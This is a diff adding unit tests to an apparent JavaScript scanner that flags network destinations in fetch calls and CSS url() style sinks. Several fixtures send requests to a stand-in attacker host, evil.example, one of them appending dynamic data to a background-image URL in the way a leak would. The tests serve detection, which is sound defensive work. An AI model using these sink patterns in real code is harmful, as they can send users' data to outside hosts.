@@ -70,6 +70,39 @@ test("scanNetworkSinks reads host through a CSS url() wrapper", () => {
   assert.equal(hit.host, "cdn.example.com");
 });
 
+// Only a style sink reads url() wrappers. Any other sink classifies its value as
+// written, so a url( in a query string cannot hide the destination.
+test("a url( in a query string does not hide a fetch destination", () => {
+  const hit = one('fetch("https://evil.example/c?u=url(x)");');
+  assert.equal(hit.destClass, URL_CLASS.REMOTE);
+  assert.equal(hit.host, "evil.example");
+});
+
+// cssText is a declaration list: every url() of every declaration is a
+// destination and the gravest decides, not the first one.
+test("every url() of a cssText declaration list counts", () => {
+  const hit = one(
+    'el.style.cssText = "background:url(local.png); x:url(https://evil.example/a)";'
+  );
+  assert.equal(hit.destClass, URL_CLASS.REMOTE);
+  assert.equal(hit.host, "evil.example");
+});
+
+// A style value built as a prefix ends inside an unclosed url(): the dynamic tail
+// continues the URL, so it is read with prefix semantics.
+test("a style url() prefix is read as a URL prefix", () => {
+  assert.equal(
+    one('el.style.backgroundImage = "url(" + x + ")";').destClass,
+    URL_CLASS.DYNAMIC
+  );
+  const hit = one(
+    'el.style.backgroundImage = "url(https://evil.example/" + x + ")";'
+  );
+  assert.equal(hit.destClass, URL_CLASS.REMOTE);
+  assert.equal(hit.host, "evil.example");
+  assert.equal(hit.dataAppended, true);
+});
+
 // A local path is neither remote nor cleartext and has no host.
 test("a local path has no host and is not cleartext", () => {
   const hit = one('fetch("/api/local.json");');
